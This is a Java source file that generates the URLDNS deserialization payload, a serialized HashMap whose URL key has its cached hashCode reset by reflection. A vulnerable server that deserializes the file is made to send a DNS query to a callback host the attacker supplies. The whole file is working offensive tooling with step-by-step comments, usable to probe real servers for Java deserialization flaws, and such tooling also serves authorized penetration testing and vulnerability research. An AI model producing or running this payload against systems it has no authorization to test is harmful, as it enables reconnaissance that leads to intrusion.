import java.io.*;
import java.net.*;
import java.lang.reflect.Field;
import java.util.HashMap;

public class MakeURLDNS {
    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.out.println("Usage: java MakeURLDNS <callback-url> <output.bin>");
            return;
        }

        String callback = args[0];
        String outfile = args[1];

        // Step 1: Create a silent URL handler that prevents DNS lookup during local construction
        URLStreamHandler silentHandler = new URLStreamHandler() {
            protected URLConnection openConnection(URL u) throws IOException { return null; }
            protected synchronized java.net.InetAddress getHostAddress(URL u) { return null; }
        };

        // Step 2: Build the URL and put it in a HashMap
        URL url = new URL(null, callback, silentHandler);
        HashMap<URL, String> map = new HashMap<>();
        map.put(url, "x");  // caches hashCode locally without triggering DNS

        // Step 3: Reset URL.hashCode to -1 via reflection
        // When the server deserializes the HashMap, HashMap.readObject() calls hashCode() again.
        // Since hashCode == -1, URL recomputes it, calling getHostAddress() → DNS query fires.
        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, -1);

        // Step 4: Serialize to disk
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outfile))) {
            oos.writeObject(map);
        }

        System.out.println("[+] Wrote " + outfile);
        System.out.println("[+] Size: " + new File(outfile).length() + " bytes");
    }
}
